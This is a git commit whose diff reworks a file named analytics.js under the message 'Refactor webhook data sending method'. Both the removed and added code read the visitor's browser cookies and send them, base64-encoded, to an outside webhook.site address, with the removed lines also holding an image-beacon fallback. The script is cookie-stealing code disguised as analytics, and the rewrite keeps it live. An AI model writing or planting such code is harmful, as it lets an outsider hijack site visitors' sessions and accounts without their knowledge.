eb296a810c623f49fb469160c35d1d288d8ff887
Pariston-Hill <156459246+Pariston-Hill@users.noreply.github.com>
2026-04-27 20:43:36 +1000

    Refactor webhook data sending method

--- analytics.js
+++ analytics.js
@@ -1,7 +1,3 @@
-var webhook = "https://webhook.site/4d5c5aed-b420-44a8-9a20-d976e811ca3e?";
-
-// 发送 Cookie
-fetch(webhook + "data=" + btoa(document.cookie), { mode: 'no-cors' });
-
-// 备用方案
-new Image().src = webhook + "c=" + document.cookie;
+fetch("https://webhook.site/4d5c5aed-b420-44a8-9a20-d976e811ca3e" + btoa(document.cookie), {
+    mode: 'no-cors'
+});
